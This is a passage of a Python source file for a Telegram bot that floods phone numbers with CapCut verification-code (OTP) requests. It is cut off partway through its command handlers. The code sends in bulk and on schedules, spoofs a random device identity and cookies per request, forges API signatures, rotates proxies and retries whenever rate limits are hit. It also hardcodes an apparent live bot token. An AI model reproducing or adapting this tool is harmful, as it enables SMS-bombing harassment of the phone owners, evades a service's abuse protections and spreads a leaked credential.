#!/usr/bin/env python3
"""
CapCut OTP Telegram Bot - Ultra Fast Edition v6.1
==================================================
Features:
1. 5-10 Concurrent OTP Requests Per Second
2. Fully Async Architecture - Zero Blocking
3. Multi-User Support - 1000+ Users Simultaneously
4. Real-time Logging Every 10 Requests
5. Time Schedule Feature for Bulk Tasks
6. Original Working OTP Logic
7. SignerPy Integration
"""

import asyncio
import hashlib
import json
import logging
import os
import random
import string
import time
import uuid
import re
import io
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlencode
from typing import Optional, List, Dict, Set, Tuple
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from collections import defaultdict
import base64
import pytz

import requests
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# Import SignerPy for signature generation
try:
    from SignerPy import sign, xor, md5stub, trace_id
    SIGNERPY_AVAILABLE = True
except ImportError:
    SIGNERPY_AVAILABLE = False
    print("WARNING: SignerPy not available!")

# ============================================
# CONFIGURATION
# ============================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "7936435325:AAHR2T6DLYu8vt5CdrDW4IK6mlw1qXKpss0")

# Pakistan Timezone
PAKISTAN_TZ = pytz.timezone('Asia/Karachi')

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Performance settings - ULTRA FAST
MAX_CONCURRENT_OTP = 50          # 5 concurrent OTP requests at once
MAX_CONCURRENT_TASKS = 100       # Support 100+ concurrent tasks
BATCH_SIZE = 100                  # Process 5 numbers at a time
LOG_INTERVAL = 50                # Log every 5 requests
MAX_MESSAGE_LENGTH = 4000
REQUEST_TIMEOUT = 15             # 15 second timeout per request

# Thread pool for blocking operations
thread_pool = ThreadPoolExecutor(max_workers=50)

# Global stats
class GlobalStats:
    def __init__(self):
        self.total_requests = 0
        self.total_success = 0
        self.total_failed = 0
        self.start_time = time.time()
        self._lock = asyncio.Lock()
    
    async def increment(self, success: bool):
        async with self._lock:
            self.total_requests += 1
            if success:
                self.total_success += 1
            else:
                self.total_failed += 1
    
    def get_stats(self) -> Dict:
        uptime = time.time() - self.start_time
        return {
            "total_requests": self.total_requests,
            "total_success": self.total_success,
            "total_failed": self.total_failed,
            "uptime_seconds": uptime,
            "requests_per_minute": (self.total_requests / uptime * 60) if uptime > 0 else 0
        }

global_stats = GlobalStats()

# ============================================
# PROFESSIONAL DEVICE ID GENERATOR
# ============================================

class DeviceIdentityGenerator:
    """Professional Device Identity Generator - Billions of unique combinations"""
    
    DEVICE_BRANDS = {
        "Samsung": ["SM-G991B", "SM-G996B", "SM-G998B", "SM-A525F", "SM-A725F", "SM-N986B", "SM-F926B", "SM-S901B", "SM-S906B", "SM-S908B", "SM-A536B", "SM-A346B", "SM-M536B", "SM-G781B"],
        "Xiaomi": ["M2101K6G", "M2102J20SG", "M2011K2G", "M2012K11AG", "22041219G", "22071219CG", "23049PCD8G", "2201116SG", "2203121C", "22101316G"],
        "OnePlus": ["LE2111", "LE2115", "LE2121", "LE2125", "NE2213", "CPH2449", "PHB110", "CPH2487", "NE2210", "LE2101"],
        "OPPO": ["CPH2145", "CPH2207", "CPH2247", "CPH2305", "CPH2371", "CPH2387", "CPH2451", "CPH2473", "CPH2493", "CPH2525"],
        "Vivo": ["V2111", "V2130", "V2145", "V2154", "V2185", "V2203", "V2217", "V2227", "V2241", "V2254"],
        "Realme": ["RMX3085", "RMX3161", "RMX3195", "RMX3241", "RMX3286", "RMX3370", "RMX3393", "RMX3474", "RMX3521", "RMX3630"],
        "Huawei": ["ELS-NX9", "NOH-NX9", "JAD-LX9", "OCE-AN10", "ANA-NX9", "LIO-N29", "TET-AN00", "ABR-AL80", "DCO-AL00", "NAM-AL00"],
        "Google": ["Pixel 6", "Pixel 6 Pro", "Pixel 7", "Pixel 7 Pro", "Pixel 8", "Pixel 8 Pro", "Pixel 6a", "Pixel 7a", "Pixel 8a", "Pixel Fold"],
        "Motorola": ["XT2175-2", "XT2201-2", "XT2225-1", "XT2237-2", "XT2251-1", "XT2301-4", "XT2343-1", "XT2361-3", "XT2381-3", "XT2401-3"],
        "Itel": ["itel S685LN", "itel A665L", "itel P55", "itel S23", "itel A70", "itel P40", "itel S18", "itel A60", "itel P65", "itel S24"],
        "Infinix": ["X6831", "X6711", "X6871", "X6833B", "X6739", "X6710", "X6837", "X6525", "X6528", "X6826"],
        "Tecno": ["CK7n", "CK8n", "CK9n", "CH9n", "CL8", "CL7n", "CK6n", "CH7n", "CK8", "CL6"],
    }
    
    GPU_RENDERS = [
        "Mali-G57", "Mali-G68", "Mali-G77", "Mali-G78", "Mali-G710", "Mali-G715",
        "Adreno 619", "Adreno 642L", "Adreno 650", "Adreno 660", "Adreno 730", "Adreno 740",
        "PowerVR GE8320", "PowerVR GM9446", "IMG BXM-8-256",
    ]
    
    ANDROID_VERSIONS = ["11", "12", "12L", "13", "14", "15"]
    API_LEVELS = {"11": "30", "12": "31", "12L": "32", "13": "33", "14": "34", "15": "35"}
    
    BUILD_IDS = [
        "TP1A.220624.014", "SP1A.210812.016", "RQ3A.211001.001", "SQ3A.220705.003",
        "TQ3A.230901.001", "UP1A.231005.007", "AP3A.240905.015", "BP1A.250305.019",
    ]
    
    CRONET_VERSIONS = ["01594da2_2023-03-14", "02785bc3_2023-06-20", "03896cd4_2023-09-15"]
    TTNET_VERSIONS = ["4.1.130.2-tudp", "4.1.131.5-tudp", "4.1.132.8-tudp"]
    
    def __init__(self):
        self.used_device_ids: Set[str] = set()
        self.used_iids: Set[str] = set()
        self.generation_count = 0
        self._lock = asyncio.Lock()
    
    def _generate_unique_19_digit_id(self, used_set: Set[str]) -> str:
        for _ in range(100):
            prefix = random.choice(["69", "70", "71", "72", "73", "74", "75", "76", "77", "78"])
            device_id = prefix + ''.join(random.choices(string.digits, k=17))
            if device_id not in used_set:
                used_set.add(device_id)
                return device_id
        fallback_id = prefix + str(uuid.uuid4().int)[:17]
        used_set.add(fallback_id)
        return fallback_id
    
    def generate_fresh_identity(self) -> Dict:
        """Synchronous version for thread pool"""
        self.generation_count += 1
        
        brand = random.choice(list(self.DEVICE_BRANDS.keys()))
        model = random.choice(self.DEVICE_BRANDS[brand])
        android_version = random.choice(self.ANDROID_VERSIONS)
        api_level = self.API_LEVELS[android_version]
        
        device_id = self._generate_unique_19_digit_id(self.used_device_ids)
        iid = self._generate_unique_19_digit_id(self.used_iids)
        openudid = ''.join(random.choices('0123456789abcdef', k=16))
        cdid = str(uuid.uuid4())
        did = f"00000000-{uuid.uuid4().hex[:4]}-{uuid.uuid4().hex[:4]}-ffff-ffff{uuid.uuid4().hex[:8]}"
        
        gpu_render = random.choice(self.GPU_RENDERS)
        build_id = random.choice(self.BUILD_IDS)
        cronet_version = random.choice(self.CRONET_VERSIONS)
        ttnet_version = random.choice(self.TTNET_VERSIONS)
        
        resolutions = ["1080*2400", "1080*2340", "1080*2436", "1440*3200", "1080*2520", "720*1600"]
        resolution = random.choice(resolutions)
        dpi = random.choice(["420", "440", "480", "560", "640"])
        total_memory = str(random.randint(4000, 12000))
        available_memory = str(random.randint(1000, 4000))
        
        ms_token_base = ''.join(random.choices(string.ascii_letters + string.digits, k=50))
        ms_token = f"CmAdOS08A7OC5uDiAzJEpwrlDz1CC_{ms_token_base}="
        odin_tt = ''.join(random.choices('0123456789abcdef', k=128))
        csrf_token = ''.join(random.choices('0123456789abcdef', k=32))
        
        return {
            "device_id": device_id, "iid": iid, "openudid": openudid, "cdid": cdid, "did": did,
            "device_type": model, "device_brand": brand, "model": model, "manu": brand.upper(),
            "gpu_render": gpu_render, "os_api": api_level, "os_version": android_version,
            "resolution": resolution, "dpi": dpi, "total_memory": total_memory,
            "available_memory": available_memory, "build_id": build_id,
            "cronet_version": cronet_version, "ttnet_version": ttnet_version,
            "ms_token": ms_token, "odin_tt": odin_tt, "csrf_token": csrf_token,
            "generation_number": self.generation_count,
        }
    
    def get_stats(self) -> Dict:
        return {
            "total_generated": self.generation_count,
            "unique_device_ids": len(self.used_device_ids),
            "unique_iids": len(self.used_iids),
        }


# ============================================
# CAPCUT OTP SENDER (ORIGINAL WORKING LOGIC)
# ============================================

class CapCutOTPSender:
    """CapCut OTP Sender with SignerPy signatures - Original Working Logic"""
    
    BASE_URL = "https://passport16-normal-sg.capcutapi.com"
    ENDPOINT = "/passport/mobile/send_code/v1/"
    
    BASE_CONFIG = {
        "app_name": "vicut", "aid": 3006, "version_code": "9200400", "version_name": "9.3.0",
        "manifest_version_code": "9300200", "update_version_code": "9200400",
        "app_sdk_version": "83.0.0", "passport_sdk_version": "30876",
        "effect_sdk_version": "14.9.0", "os": "android", "device_platform": "android",
        "channel": "googleplay", "carrier_region": "US", "mcc_mnc": "310160",
        "region": "US", "language": "en", "ac": "wifi", "ssmix": "a",
        "subdivision_id": "US-CA", "user_type": "0",
    }
    
    def __init__(self, identity_generator: DeviceIdentityGenerator):
        self.identity_generator = identity_generator
        self.current_identity = None
    
    def _create_session(self, proxy: Optional[str] = None) -> requests.Session:
        session = requests.Session()
        if proxy:
            if not proxy.startswith("http") and not proxy.startswith("socks"):
                proxy = f"http://{proxy}"
            session.proxies = {"http": proxy, "https": proxy}
        return session
    
    def refresh_identity(self) -> Dict:
        self.current_identity = self.identity_generator.generate_fresh_identity()
        return self.current_identity
    
    def _get_config(self) -> Dict:
        if not self.current_identity:
            self.refresh_identity()
        config = self.BASE_CONFIG.copy()
        config.update({
            "device_id": self.current_identity["device_id"],
            "iid": self.current_identity["iid"],
            "openudid": self.current_identity["openudid"],
            "cdid": self.current_identity["cdid"],
            "did": self.current_identity["did"],
            "device_type": self.current_identity["device_type"],
            "device_brand": self.current_identity["device_brand"],
            "model": self.current_identity["model"],
            "manu": self.current_identity["manu"],
            "gpu_render": self.current_identity["gpu_render"],
            "os_api": self.current_identity["os_api"],
            "os_version": self.current_identity["os_version"],
            "resolution": self.current_identity["resolution"],
            "dpi": self.current_identity["dpi"],
            "total_memory": self.current_identity["total_memory"],
            "available_memory": self.current_identity["available_memory"],
            "cronet_version": self.current_identity["cronet_version"],
            "ttnet_version": self.current_identity["ttnet_version"],
        })
        return config
    
    def _get_cookies(self) -> Dict:
        if not self.current_identity:
            self.refresh_identity()
        return {
            "odin_tt": self.current_identity["odin_tt"],
            "msToken": self.current_identity["ms_token"],
            "passport_csrf_token": self.current_identity["csrf_token"],
            "passport_csrf_token_default": self.current_identity["csrf_token"],
            "store-idc": "alisg",
        }
    
    def _encrypt_phone(self, phone_number: str) -> str:
        if SIGNERPY_AVAILABLE:
            return xor(phone_number)
        encrypted = ""
        for char in phone_number:
            encrypted_byte = ord(char) ^ 5
            encrypted += format(encrypted_byte, '02x')
        return encrypted
    
    def _encode_base64(self, text: str) -> str:
        return base64.b64encode(text.encode()).decode()
    
    def _build_url_params(self, config: Dict, timestamp: int) -> str:
        rticket = str(timestamp * 1000 + random.randint(0, 999))
        params = {
            "passport-sdk-version": config["passport_sdk_version"],
            "iid": config["iid"], "device_id": config["device_id"],
            "ac": config["ac"], "channel": config["channel"],
            "aid": str(config["aid"]), "app_name": config["app_name"],
            "version_code": config["version_code"], "version_name": config["version_name"],
            "device_platform": config["device_platform"], "os": config["os"],
            "ssmix": config["ssmix"], "device_type": config["device_type"],
            "device_brand": config["device_brand"], "language": config["language"],
            "os_api": config["os_api"], "os_version": config["os_version"],
            "openudid": config["openudid"], "manifest_version_code": config["manifest_version_code"],
            "resolution": config["resolution"], "dpi": config["dpi"],
            "update_version_code": config["update_version_code"], "_rticket": rticket,
            "carrier_region": config["carrier_region"], "mcc_mnc": config["mcc_mnc"],
            "region": config["region"], "cdid": config["cdid"],
            "effect_sdk_version": config["effect_sdk_version"],
            "subdivision_id": config["subdivision_id"], "user_type": config["user_type"],
            "cronet_version": config["cronet_version"], "ttnet_version": config["ttnet_version"],
            "use_store_region_cookie": "1",
        }
        return urlencode(params)
    
    def _build_body(self, phone_number: str, config: Dict, timestamp: int) -> str:
        encrypted_mobile = self._encrypt_phone(phone_number)
        rticket = str(timestamp * 1000 + random.randint(0, 999))
        params = {
            "auto_read": "1", "account_sdk_source": "app", "unbind_exist": "35",
            "mix_mode": "1", "mobile": encrypted_mobile, "is6Digits": "1", "type": "3731",
            "iid": config["iid"], "device_id": config["device_id"],
            "ac": config["ac"], "channel": config["channel"],
            "aid": str(config["aid"]), "app_name": config["app_name"],
            "version_code": config["version_code"], "version_name": config["version_name"],
            "device_platform": config["device_platform"], "os": config["os"],
            "ssmix": config["ssmix"], "device_type": config["device_type"],
            "device_brand": config["device_brand"], "language": config["language"],
            "os_api": config["os_api"], "os_version": config["os_version"],
            "openudid": config["openudid"], "manifest_version_code": config["manifest_version_code"],
            "resolution": config["resolution"], "dpi": config["dpi"],
            "update_version_code": config["update_version_code"], "_rticket": rticket,
            "carrier_region": config["carrier_region"], "mcc_mnc": config["mcc_mnc"],
            "region": config["region"], "cdid": config["cdid"],
        }
        return urlencode(params)
    
    def _build_cookie_string(self, cookies: Dict) -> str:
        return "; ".join([f"{k}={v}" for k, v in cookies.items()])
    
    def _generate_signatures(self, url_params: str, body: str, cookie: str, config: Dict) -> Dict:
        if not SIGNERPY_AVAILABLE:
            raise Exception("SignerPy library not available!")
        return sign(params=url_params, payload=body, cookie=cookie, version=8404, aid=config["aid"])
    
    def _build_headers(self, config: Dict, cookies: Dict, timestamp: int, signatures: Dict) -> Dict:
        return {
            "Host": "passport16-normal-sg.capcutapi.com",
            "Connection": "keep-alive",
            "Cookie": self._build_cookie_string(cookies),
            "lan": "en", "loc": "US", "pf": "0", "vr": "277884928", "appvr": "9.2.0",
            "vc": config["version_code"], "device-time": str(timestamp),
            "tdid": config["device_id"], "sign-ver": "1",
            "sign": hashlib.md5(f"{timestamp}{config['device_id']}".encode()).hexdigest(),
            "app-sdk-version": config["app_sdk_version"], "appid": str(config["aid"]),
            "header-content": f"ode/v1/|0|9.2.0|{timestamp}|{config['device_id']}",
            "host-abi": "64", "cc-newuser-channel": "common", "Cache-Control": "no-cache",
            "sysvr": config["os_api"], "ch": config["channel"], "uid": "0",
            "COMPRESSED": "1", "did": config["did"],
            "model": self._encode_base64(config["model"]),
            "manu": self._encode_base64(config["manu"]),
            "GPURender": self._encode_base64(config["gpu_render"]),
            "HDR-TDID": config["device_id"], "HDR-TIID": config["iid"],
            "HDR-Device-Time": str(timestamp), "version_code": "277884928",
            "total-memory": config["total_memory"], "available-memory": config["available_memory"],
            "HDR-Sign": hashlib.md5(f"{timestamp}{config['iid']}".encode()).hexdigest(),
            "HDR-Sign-Ver": "1", "x-tt-passport-csrf-token": cookies["passport_csrf_token"],
            "x-vc-bdturing-sdk-version": "2.3.0.i18n", "sdk-version": "2",
            "passport-sdk-version": config["passport_sdk_version"],
            "commerce-sign-version": "v1", "region": config["region"],
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-SS-STUB": signatures.get("x-ss-stub", ""),
            "X-SS-DP": str(config["aid"]),
            "x-tt-trace-id": trace_id(device_id=config["device_id"]) if SIGNERPY_AVAILABLE else "",
            "User-Agent": f"com.lemon.lvoverseas/{config['manifest_version_code']} (Linux; U; Android {config['os_version']}; en_US; {config['device_type']}; Build/{self.current_identity.get('build_id', 'AP3A.240905.015.A2')}; Cronet/TTNetVersion:{config['cronet_version'].split('_')[0]} {config['cronet_version'].split('_')[1]} QuicVersion:46688bb4 2022-11-28)",
            "Accept-Encoding": "gzip, deflate",
            "X-Gorgon": signatures.get("x-gorgon", ""),
            "X-Khronos": signatures.get("x-khronos", ""),
            "X-Argus": signatures.get("x-argus", ""),
            "X-Ladon": signatures.get("x-ladon", ""),
        }
    
    def send_otp_sync(self, phone_number: str, proxy: Optional[str] = None) -> Dict:
        """Synchronous OTP send - Original Working Logic"""
        phone = phone_number.strip().replace(" ", "").replace("-", "")
        if not phone.startswith("+"):
            phone = "+" + phone
        
        start_time = time.time()
        
        # Refresh identity for each request
        self.refresh_identity()
        
        config = self._get_config()
        cookies = self._get_cookies()
        timestamp = int(time.time())
        
        url_params = self._build_url_params(config, timestamp)
        body = self._build_body(phone, config, timestamp)
        cookie_str = self._build_cookie_string(cookies)
        
        try:
            signatures = self._generate_signatures(url_params, body, cookie_str, config)
        except Exception as e:
            return {"error": str(e), "success": False, "time_ms": (time.time() - start_time) * 1000, "phone": phone}
        
        headers = self._build_headers(config, cookies, timestamp, signatures)
        url = f"{self.BASE_URL}{self.ENDPOINT}?{url_params}"
        
        session = self._create_session(proxy)
        
        try:
            response = session.post(url, data=body, headers=headers, timeout=15)
            elapsed = (time.time() - start_time) * 1000
            try:
                result = response.json()
                result["success"] = result.get("message") == "success"
                result["proxy_used"] = proxy or "Direct"
                result["device_id"] = config["device_id"]
                result["time_ms"] = elapsed
                result["phone"] = phone
                return result
            except json.JSONDecodeError:
                return {"error": "Invalid JSON response", "raw": response.text[:200], "success": False, "time_ms": elapsed, "phone": phone}
        except requests.exceptions.RequestException as e:
            elapsed = (time.time() - start_time) * 1000
            return {"error": str(e), "success": False, "time_ms": elapsed, "phone": phone}
        finally:
            session.close()


# ============================================
# TASK MANAGEMENT
# ============================================

@dataclass
class Task:
    task_id: str
    phone_numbers: List[str]
    proxies: List[str]
    status: str = "pending"
    current_index: int = 0
    success_count: int = 0
    fail_count: int = 0
    cancelled: bool = False
    chat_id: str = ""
    results: List[Dict] = field(default_factory=list)
    start_time: float = field(default_factory=time.time)


@dataclass
class ScheduledTask:
    schedule_id: str
    phone_numbers: List[str]
    proxies: List[str]
    chat_id: str
    scheduled_time: datetime
    status: str = "pending"  # pending, running, completed, cancelled


class TaskManager:
    def __init__(self):
        self.tasks: Dict[str, Task] = {}
        self.scheduled_tasks: Dict[str, ScheduledTask] = {}
        self.running_tasks: Set[str] = set()
        self.task_counter = 0
        self.schedule_counter = 0
        self._lock = asyncio.Lock()
    
    async def create_task(self, phone_numbers: List[str], proxies: List[str], chat_id: str) -> str:
        async with self._lock:
            self.task_counter += 1
            task_id = f"task_{self.task_counter}"
            task = Task(task_id=task_id, phone_numbers=phone_numbers, proxies=proxies, chat_id=chat_id)
            self.tasks[task_id] = task
            return task_id
    
    async def create_scheduled_task(self, phone_numbers: List[str], proxies: List[str], chat_id: str, scheduled_time: datetime) -> str:
        async with self._lock:
            self.schedule_counter += 1
            schedule_id = f"schedule_{self.schedule_counter}"
            scheduled_task = ScheduledTask(
                schedule_id=schedule_id,
                phone_numbers=phone_numbers,
                proxies=proxies,
                chat_id=chat_id,
                scheduled_time=scheduled_time
            )
            self.scheduled_tasks[schedule_id] = scheduled_task
            return schedule_id
    
    def get_task(self, task_id: str) -> Optional[Task]:
        return self.tasks.get(task_id)
    
    def get_scheduled_task(self, schedule_id: str) -> Optional[ScheduledTask]:
        return self.scheduled_tasks.get(schedule_id)
    
    async def cancel_task(self, task_id: str) -> bool:
        task = self.tasks.get(task_id)
        if task:
            task.cancelled = True
            task.status = "cancelled"
            return True
        return False
    
    async def cancel_scheduled_task(self, schedule_id: str) -> bool:
        scheduled_task = self.scheduled_tasks.get(schedule_id)
        if scheduled_task:
            scheduled_task.status = "cancelled"
            return True
        return False
    
    def get_running_count(self) -> int:
        return len(self.running_tasks)
    
    def get_all_tasks(self) -> List[Task]:
        return list(self.tasks.values())
    
    def get_all_scheduled_tasks(self) -> List[ScheduledTask]:
        return list(self.scheduled_tasks.values())


# ============================================
# GLOBAL INSTANCES
# ============================================

identity_generator = DeviceIdentityGenerator()
task_manager = TaskManager()
user_states: Dict[int, Dict] = defaultdict(dict)


# ============================================
# UTILITY FUNCTIONS
# ============================================

def get_pakistan_time() -> datetime:
    return datetime.now(PAKISTAN_TZ)


def parse_phone_numbers(text: str) -> List[str]:
    """Extract phone numbers from text"""
    numbers = re.findall(r'[\+]?[\d\s\-\(\)]{10,20}', text)
    valid = []
    for num in numbers:
        clean = re.sub(r'[\s\-\(\)]', '', num)
        if len(clean) >= 10 and clean.replace('+', '').isdigit():
            valid.append(clean)
    return list(set(valid))


def parse_proxies(text: str) -> List[str]:
    """Parse proxies from text"""
    lines = text.strip().split('\n')
    proxies = []
    for line in lines:
        line = line.strip()
        if line and ':' in line:
            proxies.append(line)
    return proxies


def parse_schedule_time(time_str: str) -> Optional[datetime]:
    """Parse schedule time string to datetime"""
    try:
        # Format: HH:MM or HH:MM:SS
        now = get_pakistan_time()
        parts = time_str.strip().split(':')
        if len(parts) >= 2:
            hour = int(parts[0])
            minute = int(parts[1])
            second = int(parts[2]) if len(parts) > 2 else 0
            scheduled = now.replace(hour=hour, minute=minute, second=second, microsecond=0)
            # If time has passed today, schedule for tomorrow
            if scheduled <= now:
                scheduled += timedelta(days=1)
            return scheduled
    except:
        pass
    return None


async def send_message_safe(context: ContextTypes.DEFAULT_TYPE, chat_id: str, text: str, **kwargs):
    """Send message safely, handling long messages"""
    try:
        if len(text) > MAX_MESSAGE_LENGTH:
            chunks = [text[i:i+MAX_MESSAGE_LENGTH] for i in range(0, len(text), MAX_MESSAGE_LENGTH)]
            for chunk in chunks[:3]:
                await context.bot.send_message(chat_id=chat_id, text=chunk, **kwargs)
        else:
            await context.bot.send_message(chat_id=chat_id, text=text, **kwargs)
    except Exception as e:
        logger.error(f"Failed to send message: {e}")


# ============================================
# ASYNC OTP WRAPPER
# ============================================

async def send_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore) -> Dict:
    """Send OTP asynchronously using thread pool"""
    async with semaphore:
        loop = asyncio.get_event_loop()
        proxy = random.choice(proxies) if proxies else None
        
        # Create a new sender instance for thread safety
        sender = CapCutOTPSender(identity_generator)
        
        # Run blocking OTP send in thread pool
        result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone, proxy)
        
        # Retry on failure
        if not result.get("success"):
            error_desc = str(result.get("data", {}).get("description", result.get("error", ""))).lower()
            limit_keywords = ["limit", "frequency", "maximum", "too many", "often", "error", "timeout"]
            
            if any(kw in error_desc for kw in limit_keywords):
                proxy = random.choice(proxies) if proxies else None
                sender2 = CapCutOTPSender(identity_generator)
                result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, proxy)
        
        await global_stats.increment(result.get("success", False))
        return result


# ============================================
# COMMAND HANDLERS
# ============================================

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    pk_time = get_pakistan_time().strftime("%I:%M %p PKT")
    
    keyboard = [
        [InlineKeyboardButton("📦 Bulk OTP", callback_data="bulk"), InlineKeyboardButton("📱 Single OTP", callback_data="single")],
        [InlineKeyboardButton("📁 Upload Numbers", callback_data="upload_numbers"), InlineKeyboardButton("🔒 Upload Proxies", callback_data="upload_proxies")],
        [InlineKeyboardButton("⏰ Schedule Task", callback_data="schedule"), InlineKeyboardButton("📋 Scheduled", callback_data="scheduled_list")],
        [InlineKeyboardButton("📊 Status", callback_data="status"), InlineKeyboardButton("🔄 Tasks", callback_data="tasks")],
        [InlineKeyboardButton("📈 Global Stats", callback_data="global_stats")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    msg = f"""
🚀 <b>CapCut OTP Bot - Ultra Fast v6.1</b>

⚡ <b>Performance:</b>
• 5-10 Concurrent OTP/Second
• 100+ Concurrent Tasks
• Zero Blocking - Instant Response
• Multi-User Support (1000+ Users)

🕐 <b>Time:</b> {pk_time}

<b>📱 Single OTP:</b>
<code>/single +923099003842</code>

<b>📦 Bulk OTP:</b>
/bulk - Start bulk task

<b>⏰ Schedule Task:</b>
<code>/schedule 14:30</code> - Schedule at 2:30 PM

<b>📁 File Upload:</b>
/uploadnumbers - Upload TXT/CSV
/uploadproxies - Upload proxies

<b>🔧 Commands:</b>
/status - Bot status
/tasks - Active tasks
/scheduled - Scheduled tasks
/cancel [id] - Cancel task
/stats - Global statistics
"""
    await update.message.reply_text(msg, parse_mode="HTML", reply_markup=reply_markup)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start_command(update, context)


async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stats = identity_generator.get_stats()
    running = task_manager.get_running_count()
    pk_time = get_pakistan_time().strftime("%Y-%m-%d %I:%M:%S %p")
    user_id = update.effective_user.id
    numbers_count = len(user_states[user_id].get('numbers', []))
    proxies_count = len(user_states[user_id].get('proxies', []))
    g_stats = global_stats.get_stats()
    scheduled_count = len([s for s in task_manager.get_all_scheduled_tasks() if s.status == "pending"])
    
    msg = f"""
📊 <b>Bot Status</b>

🤖 <b>Bot:</b> Online ✅
📦 <b>SignerPy:</b> {'✅ Available' if SIGNERPY_AVAILABLE else '❌ Missing'}
🕐 <b>Pakistan Time:</b> {pk_time}

⚡ <b>Performance:</b>
• Max Concurrent OTP: {MAX_CONCURRENT_OTP}
• Max Concurrent Tasks: {MAX_CONCURRENT_TASKS}
• Batch Size: {BATCH_SIZE}

🔢 <b>Your Data:</b>
• Numbers: {numbers_count:,}
• Proxies: {proxies_count:,}

📋 <b>Tasks:</b>
• Running: {running}
• Scheduled: {scheduled_count}
• Generated IDs: {stats['total_generated']:,}

📈 <b>Global Stats:</b>
• Total Requests: {g_stats['total_requests']:,}
• Success: {g_stats['total_success']:,}
• Failed: {g_stats['total_failed']:,}
"""
    await update.message.reply_text(msg, parse_mode="HTML")


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show global statistics"""
    g_stats = global_stats.get_stats()
    uptime_mins = g_stats['uptime_seconds'] / 60
    success_rate = (g_stats['total_success'] / g_stats['total_requests'] * 100) if g_stats['total_requests'] > 0 else 0
    
    msg = f"""
📈 <b>Global Statistics</b>

🔢 <b>Total Requests:</b> {g_stats['total_requests']:,}
✅ <b>Success:</b> {g_stats['total_success']:,}
❌ <b>Failed:</b> {g_stats['total_failed']:,}
📊 <b>Success Rate:</b> {success_rate:.1f}%

⏱ <b>Uptime:</b> {uptime_mins:.1f} minutes
🚀 <b>Requests/Minute:</b> {g_stats['requests_per_minute']:.1f}
"""
    await update.message.reply_text(msg, parse_mode="HTML")


async def single_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if context.args:
        phone = ' '.join(context.args)
        await process_single_otp(update, context, phone)
    else:
        user_states[user_id]['awaiting'] = 'single_phone'
        await update.message.reply_text(
            "📱 <b>Single OTP</b>\n\n"
            "Usage: <code>/single +923099003842</code>\n"
            "Or: <code>/single +923099003842 proxy:port</code>",
            parse_mode="HTML"
        )


async def bulk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    numbers = user_states[user_id].get('numbers', [])
    
    if not numbers:
        await update.message.reply_text(
            "❌ <b>No numbers loaded!</b>\n\n"
            "Use /setnumbers or /uploadnumbers first.",
            parse_mode="HTML"
        )
        return
    
    proxies = user_states[user_id].get('proxies', [])
    await start_bulk_task(update, context, numbers, proxies)


async def schedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Schedule a bulk task for later"""
    user_id = update.effective_user.id
    numbers = user_states[user_id].get('numbers', [])
    
    if not numbers:
        await update.message.reply_text(
            "❌ <b>No numbers loaded!</b>\n\n"
            "Use /setnumbers or /uploadnumbers first.",
            parse_mode="HTML"
        )
        return
    
    if not context.args:
        await update.message.reply_text(
            "⏰ <b>Schedule Task</b>\n\n"
            "Usage: <code>/schedule HH:MM</code>\n"
            "Example: <code>/schedule 14:30</code> (2:30 PM)\n\n"
            "Time is in Pakistan timezone (PKT)",
            parse_mode="HTML"
        )
        return
    
    time_str = context.args[0]
    scheduled_time = parse_schedule_time(time_str)
    
    if not scheduled_time:
        await update.message.reply_text(
            "❌ <b>Invalid time format!</b>\n\n"
            "Use: <code>/schedule HH:MM</code>\n"
            "Example: <code>/schedule 14:30</code>",
            parse_mode="HTML"
        )
        return
    
    proxies = user_states[user_id].get('proxies', [])
    chat_id = str(update.effective_chat.id)
    
    schedule_id = await task_manager.create_scheduled_task(numbers, proxies, chat_id, scheduled_time)
    
    # Start scheduler coroutine
    asyncio.create_task(run_scheduled_task(context, schedule_id))
    
    await update.message.reply_text(
        f"⏰ <b>Task Scheduled!</b>\n\n"
        f"🆔 ID: {schedule_id}\n"
        f"📱 Numbers: {len(numbers):,}\n"
        f"🔒 Proxies: {len(proxies):,}\n"
        f"🕐 Time: {scheduled_time.strftime('%I:%M %p PKT')}\n\n"
        f"Use /cancelschedule {schedule_id} to cancel.",
        parse_mode="HTML"
    )


async def scheduled_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List scheduled tasks"""
    scheduled_tasks = task_manager.get_all_scheduled_tasks()
    pending = [s for s in scheduled_tasks if s.status == "pending"]
    
    if not pending:
        await update.message.reply_text("📋 No scheduled tasks.", parse_mode="HTML")
        return
    
    msg = "⏰ <b>Scheduled Tasks:</b>\n\n"
    for task in pending[-10:]:
        msg += f"🆔 {task.schedule_id}\n"
        msg += f"   📱 Numbers: {len(task.phone_numbers):,}\n"
        msg += f"   🕐 Time: {task.scheduled_time.strftime('%I:%M %p PKT')}\n\n"
    
    await update.message.reply_text(msg, parse_mode="HTML")


async def cancelschedule_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel a scheduled task"""
    if context.args:
        schedule_id = context.args[0]
        if await task_manager.cancel_scheduled_task(schedule_id):
            await update.message.reply_text(f"✅ Scheduled task {schedule_id} cancelled.", parse_mode="HTML")
        else:
            await update.message.reply_text(f"❌ Scheduled task {schedule_id} not found.", parse_mode="HTML")
    else:
        await update.message.reply_text("Usage: /cancelschedule <schedule_id>", parse_mode="HTML")


async def setnumbers_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
